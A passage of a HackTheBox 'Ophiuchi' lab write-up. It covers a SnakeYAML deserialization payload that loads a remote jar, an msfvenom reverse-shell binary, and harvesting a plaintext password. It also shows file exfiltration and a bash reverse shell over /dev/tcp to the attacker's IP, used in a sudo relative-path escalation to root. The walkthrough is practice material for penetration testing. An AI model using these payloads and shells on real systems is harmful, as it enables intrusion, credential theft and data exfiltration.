<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «yaml-payload» «10.10.14.23» git:<span class=o>(</span>master<span class=o>)</span> ✗ 
$  javac src/artsploit/AwesomeScriptEngineFactory.java <span class=o>&amp;&amp;</span> jar -cvf yaml-payload.jar -C src/ .
Picked up _JAVA_OPTIONS: -Dawt.useSystemAAFontSettings<span class=o>=</span>on -Dswing.aatext<span class=o>=</span><span class=nb>true</span>
adding: META-INF/ <span class=o>(</span><span class=nv>in</span><span class=o>=</span>0<span class=o>)</span> <span class=o>(</span><span class=nv>out</span><span class=o>=</span>0<span class=o>)</span> <span class=o>(</span>stored 0%<span class=o>)</span>
adding: META-INF/MANIFEST.MF <span class=o>(</span><span class=nv>in</span><span class=o>=</span>56<span class=o>)</span> <span class=o>(</span><span class=nv>out</span><span class=o>=</span>56<span class=o>)</span> <span class=o>(</span>stored 0%<span class=o>)</span>
adding: ./ <span class=o>(</span><span class=nv>in</span><span class=o>=</span>0<span class=o>)</span> <span class=o>(</span><span class=nv>out</span><span class=o>=</span>0<span class=o>)</span> <span class=o>(</span>stored 0%<span class=o>)</span>
adding: META-INF/ <span class=o>(</span><span class=nv>in</span><span class=o>=</span>0<span class=o>)</span> <span class=o>(</span><span class=nv>out</span><span class=o>=</span>0<span class=o>)</span> <span class=o>(</span>stored 0%<span class=o>)</span>
adding: META-INF/services/ <span class=o>(</span><span class=nv>in</span><span class=o>=</span>0<span class=o>)</span> <span class=o>(</span><span class=nv>out</span><span class=o>=</span>0<span class=o>)</span> <span class=o>(</span>stored 0%<span class=o>)</span>
adding: META-INF/services/javax.script.ScriptEngineFactoed -5%<span class=o>)</span>
adding: artsploit/ <span class=o>(</span><span class=nv>in</span><span class=o>=</span>0<span class=o>)</span> <span class=o>(</span><span class=nv>out</span><span class=o>=</span>0<span class=o>)</span> <span class=o>(</span>stored 0%<span class=o>)</span>
adding: artsploit/AwesomeScriptEngineFactory.class <span class=o>(</span><span class=nv>in</span><span class=o>=</span>1%<span class=o>)</span>
adding: artsploit/AwesomeScriptEngineFactory.java~ <span class=o>(</span><span class=nv>in</span><span class=o>=</span>5<span class=o>)</span>
adding: artsploit/AwesomeScriptEngineFactory.java <span class=o>(</span><span class=nv>in</span><span class=o>=</span>16<span class=o>)</span>
Total:
------
<span class=o>(</span><span class=nv>in</span> <span class=o>=</span> 4083<span class=o>)</span> <span class=o>(</span><span class=nv>out</span> <span class=o>=</span> 2846<span class=o>)</span> <span class=o>(</span>deflated 30%<span class=o>)</span>
</code></pre></div><p>Then I will create my malicious binary using <code>msfvenom</code>. This binary along with the jar will be hosted using a Python web server.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «exploits» «10.10.14.23» 
$ msfvenom -p linux/x64/shell_reverse_tcp <span class=nv>lhost</span><span class=o>=</span>10.10.14.23 <span class=nv>lport</span><span class=o>=</span><span class=m>53</span> -f elf -o iamf-shell
<span class=o>[</span>-<span class=o>]</span> No platform was selected, choosing Msf::Module::Platform::Linux from the payload
<span class=o>[</span>-<span class=o>]</span> No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: <span class=m>74</span> bytes
Final size of elf file: <span class=m>194</span> bytes
Saved as: iamf-shell
</code></pre></div><p>Finally, I will setup a netcat listener and submit the following payload.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-yaml data-lang=yaml><span class=cp>!!javax.script.ScriptEngineManager</span><span class=w> </span><span class=p>[</span><span class=w>
</span><span class=w>  </span><span class=cp>!!java.net.URLClassLoader</span><span class=w> </span><span class=p>[[</span><span class=w>
</span><span class=w>    </span><span class=cp>!!java.net.URL</span><span class=w> </span><span class=p>[</span><span class=s2>&#34;http://10.10.14.23/yaml-payload.jar&#34;</span><span class=p>]</span><span class=w>
</span><span class=w>  </span><span class=p>]]</span><span class=w>
</span><span class=w></span><span class=p>]</span><span class=w>
</span></code></pre></div><p>Within a few seconds, I get an interactive shell as tomcat.</p>
<p><div class=img-container><img src=imgs/image-20210729220701287.png alt=image-20210729220701287></div>
</p>
<h4 id=shell-upgrade>Shell Upgrade<a class=anchor aria-hidden=true href=#shell-upgrade>#</a></h4>
<p>As usual, I will do the PTY trick to upgrade my shell.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>which script
/usr/bin/script                                                     
script /dev/null -c bash                                            
Script started, file is /dev/null                                   
tomcat@ophiuchi:/$ <span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
<span class=nb>export</span> <span class=nv>TERM</span><span class=o>=</span>xterm
tomcat@ophiuchi:/$ ^Z 
<span class=o>[</span>2<span class=o>]</span>  + <span class=m>7400</span> suspended  nc -nvlp <span class=m>53</span>
→ kali@kali «exploits» «10.10.14.23» 
$ stty raw -echo<span class=p>;</span><span class=nb>fg</span>
<span class=o>[</span>2<span class=o>]</span>  - <span class=m>7400</span> continued  nc -nvlp <span class=m>53</span>

tomcat@ophiuchi:/$ stty rows <span class=m>30</span> cols <span class=m>126</span>
</code></pre></div><h2 id=privilege-escalation>Privilege Escalation<a class=anchor aria-hidden=true href=#privilege-escalation>#</a></h2>
<h3 id=shell-as-admin>Shell as admin<a class=anchor aria-hidden=true href=#shell-as-admin>#</a></h3>
<h4 id=enumeration-1>Enumeration<a class=anchor aria-hidden=true href=#enumeration-1>#</a></h4>
<p>There are only two users in this machine who have login shell: <code>root</code> and <code>admin</code>.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>tomcat@ophiuchi:/opt/tomcat$ cat /etc/passwd <span class=p>|</span> grep sh$
root:x:0:0:root:/root:/bin/bash
admin:x:1000:1000:,,,:/home/admin:/bin/bash
</code></pre></div><p>Using <code>grep</code> to search for a &ldquo;password&rdquo; recursively on the tomcat home directory (<code>/opt/tomcat</code>) reveals a set of credentials for user <code>admin</code>.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>tomcat@ophiuchi:/opt/tomcat$ grep -Ri <span class=s2>&#34;password&#34;</span> 
...<span class=o>[</span>SNIP<span class=o>]</span>...
conf/tomcat-users.xml:&lt;user <span class=nv>username</span><span class=o>=</span><span class=s2>&#34;admin&#34;</span> <span class=nv>password</span><span class=o>=</span><span class=s2>&#34;whythereisalimit&#34;</span> <span class=nv>roles</span><span class=o>=</span><span class=s2>&#34;manager-gui,admin-gui&#34;</span>/&gt;     ...<span class=o>[</span>SNIP<span class=o>]</span>...
</code></pre></div><h4 id=ssh---admin>SSH - admin<a class=anchor aria-hidden=true href=#ssh---admin>#</a></h4>
<p>The password <code>whythereisalimit</code> works on SSH for user <code>admin</code>.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «exploits» «10.10.14.23» 
$ ssh admin@10.10.10.227 
admin@10.10.10.227<span class=err>&#39;</span>s password: 
Welcome to Ubuntu 20.04 LTS <span class=o>(</span>GNU/Linux 5.4.0-51-generic x86_64<span class=o>)</span>

...<span class=o>[</span>SNIP<span class=o>]</span>...

  System load:             0.08
  Usage of /:              19.9% of 27.43GB
  Memory usage:            17%
  Swap usage:              0%
  Processes:               <span class=m>214</span>
  Users logged in:         <span class=m>0</span>
  IPv4 address <span class=k>for</span> ens160: 10.10.10.227
  IPv6 address <span class=k>for</span> ens160: dead:beef::250:56ff:feb9:90cf


...<span class=o>[</span>SNIP<span class=o>]</span>...

Last login: Mon Jan <span class=m>11</span> 08:23:12 <span class=m>2021</span> from 10.10.14.2
admin@ophiuchi:~$ id
<span class=nv>uid</span><span class=o>=</span>1000<span class=o>(</span>admin<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>1000<span class=o>(</span>admin<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>1000<span class=o>(</span>admin<span class=o>)</span>
</code></pre></div><p>User flag is done here.</p>
<h3 id=shell-as-root>Shell as root<a class=anchor aria-hidden=true href=#shell-as-root>#</a></h3>
<h4 id=enumeration-2>Enumeration<a class=anchor aria-hidden=true href=#enumeration-2>#</a></h4>
<p>User <code>admin</code> is allowed to run a Go program as root.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>admin@ophiuchi:~$ sudo -l
Matching Defaults entries <span class=k>for</span> admin on ophiuchi:
    env_reset, mail_badpass, <span class=nv>secure_path</span><span class=o>=</span>/usr/local/sbin<span class=se>\:</span>/usr/local/bin<span class=se>\:</span>/usr/sbin<span class=se>\:</span>/usr/bin<span class=se>\:</span>/sbin<span class=se>\:</span>/bin<span class=se>\:</span>/snap/bin

User admin may run the following commands on ophiuchi:
    <span class=o>(</span>ALL<span class=o>)</span> NOPASSWD: /usr/bin/go run /opt/wasm-functions/index.go
</code></pre></div><h4 id=source-code-analysis---indexgo>Source Code Analysis - index.go<a class=anchor aria-hidden=true href=#source-code-analysis---indexgo>#</a></h4>
<p>What <code>index.go</code> does is:</p>
<ul>
<li>It reads a web assembly file called <code>main.wasm</code> and creates an instance of that file.</li>
<li>It then exports a function called &ldquo;info&rdquo; from the instance and executes it. If the results of that function is &ldquo;1&rdquo;, it runs the <code>deploy.sh</code> file.</li>
</ul>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-go data-lang=go><span class=kn>package</span> <span class=nx>main</span>

<span class=kn>import</span> <span class=p>(</span>
        <span class=s>&#34;fmt&#34;</span>
        <span class=nx>wasm</span> <span class=s>&#34;github.com/wasmerio/wasmer-go/wasmer&#34;</span>
        <span class=s>&#34;os/exec&#34;</span>
        <span class=s>&#34;log&#34;</span>
<span class=p>)</span>


<span class=kd>func</span> <span class=nf>main</span><span class=p>()</span> <span class=p>{</span>
        <span class=nx>bytes</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>wasm</span><span class=p>.</span><span class=nf>ReadBytes</span><span class=p>(</span><span class=s>&#34;main.wasm&#34;</span><span class=p>)</span>

        <span class=nx>instance</span><span class=p>,</span> <span class=nx>_</span> <span class=o>:=</span> <span class=nx>wasm</span><span class=p>.</span><span class=nf>NewInstance</span><span class=p>(</span><span class=nx>bytes</span><span class=p>)</span>
        <span class=k>defer</span> <span class=nx>instance</span><span class=p>.</span><span class=nf>Close</span><span class=p>()</span>
        <span class=nx>init</span> <span class=o>:=</span> <span class=nx>instance</span><span class=p>.</span><span class=nx>Exports</span><span class=p>[</span><span class=s>&#34;info&#34;</span><span class=p>]</span>
        <span class=nx>result</span><span class=p>,</span><span class=nx>_</span> <span class=o>:=</span> <span class=nf>init</span><span class=p>()</span>
        <span class=nx>f</span> <span class=o>:=</span> <span class=nx>result</span><span class=p>.</span><span class=nf>String</span><span class=p>()</span>
        <span class=k>if</span> <span class=p>(</span><span class=nx>f</span> <span class=o>!=</span> <span class=s>&#34;1&#34;</span><span class=p>)</span> <span class=p>{</span>
                <span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;Not ready to deploy&#34;</span><span class=p>)</span>
        <span class=p>}</span> <span class=k>else</span> <span class=p>{</span>
                <span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=s>&#34;Ready to deploy&#34;</span><span class=p>)</span>
                <span class=nx>out</span><span class=p>,</span> <span class=nx>err</span> <span class=o>:=</span> <span class=nx>exec</span><span class=p>.</span><span class=nf>Command</span><span class=p>(</span><span class=s>&#34;/bin/sh&#34;</span><span class=p>,</span> <span class=s>&#34;deploy.sh&#34;</span><span class=p>).</span><span class=nf>Output</span><span class=p>()</span>
                <span class=k>if</span> <span class=nx>err</span> <span class=o>!=</span> <span class=kc>nil</span> <span class=p>{</span>
                        <span class=nx>log</span><span class=p>.</span><span class=nf>Fatal</span><span class=p>(</span><span class=nx>err</span><span class=p>)</span>
                <span class=p>}</span>
                <span class=nx>fmt</span><span class=p>.</span><span class=nf>Println</span><span class=p>(</span><span class=nb>string</span><span class=p>(</span><span class=nx>out</span><span class=p>))</span>
        <span class=p>}</span>
<span class=p>}</span>

</code></pre></div><p>Also, it&rsquo;s important to note that this <code>index.go</code> loads <code>deploy.sh</code> and <code>main.wasm</code> with relative path. The <code>deploy.sh</code> and <code>main.wasm</code> themself can be found under <code>/opt/wasms-functions</code> directory.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>admin@ophiuchi:/opt/wasm-functions$ ls -lah
total 3.9M
drwxr-xr-x <span class=m>3</span> root root 4.0K Oct <span class=m>14</span>  <span class=m>2020</span> .
drwxr-xr-x <span class=m>5</span> root root 4.0K Oct <span class=m>14</span>  <span class=m>2020</span> ..
drwxr-xr-x <span class=m>2</span> root root 4.0K Oct <span class=m>14</span>  <span class=m>2020</span> backup
-rw-r--r-- <span class=m>1</span> root root   <span class=m>88</span> Oct <span class=m>14</span>  <span class=m>2020</span> deploy.sh
-rwxr-xr-x <span class=m>1</span> root root 2.5M Oct <span class=m>14</span>  <span class=m>2020</span> index
-rw-rw-r-- <span class=m>1</span> root root  <span class=m>522</span> Oct <span class=m>14</span>  <span class=m>2020</span> index.go
-rwxrwxr-x <span class=m>1</span> root root 1.5M Oct <span class=m>14</span>  <span class=m>2020</span> main.wasm
</code></pre></div><p>The <code>deploy.sh</code> contains a to-do note of a lazy admin.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>admin@ophiuchi:/opt/wasm-functions$ cat deploy.sh 
<span class=c1>#!/bin/bash</span>

<span class=c1># ToDo</span>
<span class=c1># Create script to automatic deploy our new web at tomcat port 8080</span>
</code></pre></div><p>From here, I will exfil the entire <code>/opt/wasm-functions/</code> to my machine.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>admin@ophiuchi:/opt$ tar -czvf /tmp/wasm-functions.tar.gz wasm-functions/
wasm-functions/
wasm-functions/index
wasm-functions/index.go
wasm-functions/deploy.sh
wasm-functions/main.wasm
wasm-functions/backup/
wasm-functions/backup/index.go
wasm-functions/backup/deploy.sh
wasm-functions/backup/main.wasm
admin@ophiuchi:/opt$ cat /tmp/wasm-functions.tar.gz &gt; /dev/tcp/10.10.14.23/53
</code></pre></div><p>On my listener:</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «exploits» «10.10.14.23» 
$ nc -nvlp <span class=m>53</span> &gt; wasm-functions.tar.gz
listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>53</span> ...
connect to <span class=o>[</span>10.10.14.23<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.227<span class=o>]</span> <span class=m>45380</span>
</code></pre></div><h4 id=reversing-mainwasm>Reversing main.wasm<a class=anchor aria-hidden=true href=#reversing-mainwasm>#</a></h4>
<p>Now I need to find out the content of <code>main.wasm</code>. Fortunately there is a tool to {de,re}compile a wasm file, called <a href=https://github.com/WebAssembly/wabt/>wabt</a>. I will clone the repo and make the tool available to system-wide.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>$ wget https://github.com/WebAssembly/wabt/releases/download/1.0.23/wabt-1.0.23-ubuntu.tar.gz -O /opt/
$ tar -xvf /opt/wabt-1.0.23-ubuntu.tar.gz
$ <span class=nb>export</span> <span class=nv>PATH</span><span class=o>=</span><span class=s2>&#34;/opt/wabt-1.0.23/bin&#34;</span>:<span class=nv>$PATH</span>
</code></pre></div><p>I will decompile the <code>main.wasm</code> using <code>wasm-decompile</code>. It shows that the <code>info</code> function has return value of 0.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «wasm-functions» «10.10.14.23» 
$ wasm-decompile main.wasm 
<span class=nb>export</span> memory memory<span class=o>(</span>initial: 16, max: 0<span class=o>)</span><span class=p>;</span>

global g_a:int <span class=o>=</span> 1048576<span class=p>;</span>
<span class=nb>export</span> global data_end:int <span class=o>=</span> 1048576<span class=p>;</span>
<span class=nb>export</span> global heap_base:int <span class=o>=</span> 1048576<span class=p>;</span>

table T_a:funcref<span class=o>(</span>min: 1, max: 1<span class=o>)</span><span class=p>;</span>

<span class=nb>export</span> <span class=k>function</span> info<span class=o>()</span>:int <span class=o>{</span>
  <span class=k>return</span> <span class=m>0</span>
<span class=o>}</span>
</code></pre></div><h4 id=exploitation>Exploitation<a class=anchor aria-hidden=true href=#exploitation>#</a></h4>
<p>Since I need a return value of 1, so that <code>index.go</code> will execute the <code>deploy.sh</code>, I will create my own <code>main.wasm</code> file from the exfiltrated <code>main.wasm</code> using <code>wasm2wat</code>.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «exploits» «10.10.14.23» 
$ wasm2wat ../loot/wasm-functions/main.wasm <span class=p>|</span> tee main.wat
<span class=o>(</span>module
  <span class=o>(</span><span class=nb>type</span> <span class=o>(</span><span class=p>;</span>0<span class=p>;</span><span class=o>)</span> <span class=o>(</span>func <span class=o>(</span>result i32<span class=o>)))</span>
  <span class=o>(</span>func <span class=nv>$info</span> <span class=o>(</span><span class=nb>type</span> 0<span class=o>)</span> <span class=o>(</span>result i32<span class=o>)</span>
    i32.const 0<span class=o>)</span>
  <span class=o>(</span>table <span class=o>(</span><span class=p>;</span>0<span class=p>;</span><span class=o>)</span> <span class=m>1</span> <span class=m>1</span> funcref<span class=o>)</span>
  <span class=o>(</span>memory <span class=o>(</span><span class=p>;</span>0<span class=p>;</span><span class=o>)</span> 16<span class=o>)</span>
  <span class=o>(</span>global <span class=o>(</span><span class=p>;</span>0<span class=p>;</span><span class=o>)</span> <span class=o>(</span>mut i32<span class=o>)</span> <span class=o>(</span>i32.const 1048576<span class=o>))</span>
  <span class=o>(</span>global <span class=o>(</span><span class=p>;</span>1<span class=p>;</span><span class=o>)</span> i32 <span class=o>(</span>i32.const 1048576<span class=o>))</span>
  <span class=o>(</span>global <span class=o>(</span><span class=p>;</span>2<span class=p>;</span><span class=o>)</span> i32 <span class=o>(</span>i32.const 1048576<span class=o>))</span>
  <span class=o>(</span><span class=nb>export</span> <span class=s2>&#34;memory&#34;</span> <span class=o>(</span>memory 0<span class=o>))</span>
  <span class=o>(</span><span class=nb>export</span> <span class=s2>&#34;info&#34;</span> <span class=o>(</span>func <span class=nv>$info</span><span class=o>))</span>
  <span class=o>(</span><span class=nb>export</span> <span class=s2>&#34;__data_end&#34;</span> <span class=o>(</span>global 1<span class=o>))</span>
  <span class=o>(</span><span class=nb>export</span> <span class=s2>&#34;__heap_base&#34;</span> <span class=o>(</span>global 2<span class=o>)))</span>
</code></pre></div><p>Then I will modify the return value of the info function to 1.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>...<span class=o>[</span>SNIP<span class=o>]</span>...
  <span class=o>(</span>func <span class=nv>$info</span> <span class=o>(</span><span class=nb>type</span> 0<span class=o>)</span> <span class=o>(</span>result i32<span class=o>)</span>
    i32.const 1<span class=o>)</span>
...<span class=o>[</span>SNIP<span class=o>]</span>...
</code></pre></div><p>I will compile the <code>main.wat</code> back to <code>main.wasm</code> using <code>wat2wasm</code></p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «exploits» «10.10.14.23» 
$ wat2wasm main.wat 
</code></pre></div><p>Then I will create my own <code>deploy.sh</code> that contains a reverse shell.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «exploits» «10.10.14.23» 
$ cat deploy.sh 
<span class=c1>#!/bin/sh</span>
bash -c <span class=s2>&#34;bash -i &gt;&amp; /dev/tcp/10.10.14.23/53 0&gt;&amp;1&#34;</span>
</code></pre></div><p>I will transfer my <code>main.wasm</code> and <code>deploy.sh</code> using <code>scp</code> to<code>/tmp/</code>.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «exploits» «10.10.14.23» 
$ scp main.wasm deploy.sh  admin@10.10.10.227:/tmp
admin@10.10.10.227<span class=err>&#39;</span>s password: 
main.wasm                                                                                   100%  <span class=m>112</span>     1.7KB/s   00:00    
deploy.sh                                                                                   100%   <span class=m>60</span>     1.1KB/s   00:00 
</code></pre></div><p>Finally, I will setup a netcat listener and run the allowed sudo command on the <code>/tmp/</code> directory.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>admin@ophiuchi:/tmp$ sudo /usr/bin/go run /opt/wasm-functions/index.go
</code></pre></div><p>Now I have a root shell on my listener.</p>
<div class=highlight><pre tabindex=0 class=chroma><code class=language-shell data-lang=shell>→ kali@kali «exploits» «10.10.14.23» 
$ nc -nvlp <span class=m>53</span>
listening on <span class=o>[</span>any<span class=o>]</span> <span class=m>53</span> ...
connect to <span class=o>[</span>10.10.14.23<span class=o>]</span> from <span class=o>(</span>UNKNOWN<span class=o>)</span> <span class=o>[</span>10.10.10.227<span class=o>]</span> <span class=m>45382</span>
root@ophiuchi:/tmp# id
id
<span class=nv>uid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>gid</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span> <span class=nv>groups</span><span class=o>=</span>0<span class=o>(</span>root<span class=o>)</span>
root@ophiuchi:/tmp# 
</code></pre></div><p><div class=img-container><img src=imgs/image-20210729230638797.png alt=image-20210729230638797></div>
</p>
<hr>
<h2 id=references>Reference(s)<a class=anchor aria-hidden=true href=#references>#</a></h2>
<ul>
<li>
<p><a href=https://www.baeldung.com/java-snake-yaml>https://www.baeldung.com/java-snake-yaml</a></p>
</li>
<li>
<p><a href=https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html>https://www.fatalerrors.org/a/analysis-of-the-snakeyaml-deserialization-in-java-security.html</a></p>
</li>
<li>
<p><a href=https://webassembly.github.io/wabt/>https://webassembly.github.io/wabt/</a></p>
</li>
</ul>
</div>
</div>
<footer class=post-footer>
<ul class=post-tags>
<li><a href=https://fahmifj.github.io/tags/oscp-like/>OSCP-like</a></li>
<li><a href=https://fahmifj.github.io/tags/linux/>Linux</a></li>
<li><a href=https://fahmifj.github.io/tags/yaml/>YAML</a></li>
<li><a href=https://fahmifj.github.io/tags/deserialization/>Deserialization</a></li>
<li><a href=https://fahmifj.github.io/tags/web-assembly/>Web-assembly</a></li>
<li><a href=https://fahmifj.github.io/tags/wabt/>Wabt</a></li>
<li><a href=https://fahmifj.github.io/tags/golang/>Golang</a></li>
<li><a href=https://fahmifj.github.io/tags/code-review/>Code-review</a></li>
<li><a href=https://fahmifj.github.io/tags/sudo/>sudo</a></li>
</ul>
<div class=share-buttons>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Ophiuchi on twitter" href="https://twitter.com/intent/tweet/?text=HackTheBox%20-%20Ophiuchi&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-ophiuchi%2f&hashtags=OSCP-like%2cLinux%2cYAML%2cDeserialization%2cWeb-assembly%2cWabt%2cGolang%2cCode-review%2cSudo"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM195.519 424.544c135.939.0 210.268-112.643 210.268-210.268.0-3.218.0-6.437-.153-9.502 14.406-10.421 26.973-23.448 36.935-38.314-13.18 5.824-27.433 9.809-42.452 11.648 15.326-9.196 26.973-23.602 32.49-40.92-14.252 8.429-30.038 14.56-46.896 17.931-13.487-14.406-32.644-23.295-53.946-23.295-40.767.0-73.87 33.104-73.87 73.87.0 5.824.613 11.494 1.992 16.858-61.456-3.065-115.862-32.49-152.337-77.241-6.284 10.881-9.962 23.601-9.962 37.088.0 25.594 13.027 48.276 32.95 61.456-12.107-.307-23.448-3.678-33.41-9.196v.92c0 35.862 25.441 65.594 59.311 72.49-6.13 1.686-12.72 2.606-19.464 2.606-4.751.0-9.348-.46-13.946-1.38 9.349 29.426 36.628 50.728 68.965 51.341-25.287 19.771-57.164 31.571-91.8 31.571-5.977.0-11.801-.306-17.625-1.073 32.337 21.15 71.264 33.41 112.95 33.41z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Ophiuchi on linkedin" href="https://www.linkedin.com/shareArticle?mini=true&url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-ophiuchi%2f&title=HackTheBox%20-%20Ophiuchi&summary=HackTheBox%20-%20Ophiuchi&source=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-ophiuchi%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM160.461 423.278V197.561h-75.04v225.717h75.04zm270.539.0V293.839c0-69.333-37.018-101.586-86.381-101.586-39.804.0-57.634 21.891-67.617 37.266v-31.958h-75.021c.995 21.181.0 225.717.0 225.717h75.02V297.222c0-6.748.486-13.492 2.474-18.315 5.414-13.475 17.767-27.434 38.494-27.434 27.135.0 38.007 20.707 38.007 51.037v120.768H431zM123.448 88.722C97.774 88.722 81 105.601 81 127.724c0 21.658 16.264 39.002 41.455 39.002h.484c26.165.0 42.452-17.344 42.452-39.002-.485-22.092-16.241-38.954-41.943-39.002z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Ophiuchi on reddit" href="https://reddit.com/submit?url=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-ophiuchi%2f&title=HackTheBox%20-%20Ophiuchi"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zM446 265.638c0-22.964-18.616-41.58-41.58-41.58-11.211.0-21.361 4.457-28.841 11.666-28.424-20.508-67.586-33.757-111.204-35.278l18.941-89.121 61.884 13.157c.756 15.734 13.642 28.29 29.56 28.29 16.407.0 29.706-13.299 29.706-29.701.0-16.403-13.299-29.702-29.706-29.702-11.666.0-21.657 6.792-26.515 16.578l-69.105-14.69c-1.922-.418-3.939-.042-5.585 1.036-1.658 1.073-2.811 2.761-3.224 4.686l-21.152 99.438c-44.258 1.228-84.046 14.494-112.837 35.232-7.468-7.164-17.589-11.591-28.757-11.591-22.965.0-41.585 18.616-41.585 41.58.0 16.896 10.095 31.41 24.568 37.918-.639 4.135-.99 8.328-.99 12.576.0 63.977 74.469 115.836 166.33 115.836s166.334-51.859 166.334-115.836c0-4.218-.347-8.387-.977-12.493 14.564-6.47 24.735-21.034 24.735-38.001zM326.526 373.831c-20.27 20.241-59.115 21.816-70.534 21.816-11.428.0-50.277-1.575-70.522-21.82-3.007-3.008-3.007-7.882.0-10.889 3.003-2.999 7.882-3.003 10.885.0 12.777 12.781 40.11 17.317 59.637 17.317 19.522.0 46.86-4.536 59.657-17.321 3.016-2.999 7.886-2.995 10.885.008 3.008 3.011 3.003 7.882-.008 10.889zm-5.23-48.781c-16.373.0-29.701-13.324-29.701-29.698.0-16.381 13.328-29.714 29.701-29.714 16.378.0 29.706 13.333 29.706 29.714.0 16.374-13.328 29.698-29.706 29.698zM160.91 295.348c0-16.381 13.328-29.71 29.714-29.71 16.369.0 29.689 13.329 29.689 29.71.0 16.373-13.32 29.693-29.689 29.693-16.386.0-29.714-13.32-29.714-29.693z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Ophiuchi on facebook" href="https://facebook.com/sharer/sharer.php?u=https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-ophiuchi%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H342.978V319.085h66.6l12.672-82.621h-79.272v-53.617c0-22.603 11.073-44.636 46.58-44.636H425.6v-70.34s-32.71-5.582-63.982-5.582c-65.288.0-107.96 39.569-107.96 111.204v62.971h-72.573v82.621h72.573V512h-191.104c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892z"/></svg>
</a>
<a target=_blank rel="noopener noreferrer" aria-label="share HackTheBox - Ophiuchi on whatsapp" href="https://api.whatsapp.com/send?text=HackTheBox%20-%20Ophiuchi%20-%20https%3a%2f%2ffahmifj.github.io%2fwriteups%2fhackthebox%2fhtb-ophiuchi%2f"><svg viewBox="0 0 512 512"><path d="M449.446.0C483.971.0 512 28.03 512 62.554v386.892C512 483.97 483.97 512 449.446 512H62.554c-34.524.0-62.554-28.03-62.554-62.554V62.554c0-34.524 28.029-62.554 62.554-62.554h386.892zm-58.673 127.703c-33.842-33.881-78.847-52.548-126.798-52.568-98.799.0-179.21 80.405-179.249 179.234-.013 31.593 8.241 62.428 23.927 89.612l-25.429 92.884 95.021-24.925c26.181 14.28 55.659 21.807 85.658 21.816h.074c98.789.0 179.206-80.413 179.247-179.243.018-47.895-18.61-92.93-52.451-126.81zM263.976 403.485h-.06c-26.734-.01-52.954-7.193-75.828-20.767l-5.441-3.229-56.386 14.792 15.05-54.977-3.542-5.637c-14.913-23.72-22.791-51.136-22.779-79.287.033-82.142 66.867-148.971 149.046-148.971 39.793.014 77.199 15.531 105.329 43.692 28.128 28.16 43.609 65.592 43.594 105.4-.034 82.149-66.866 148.983-148.983 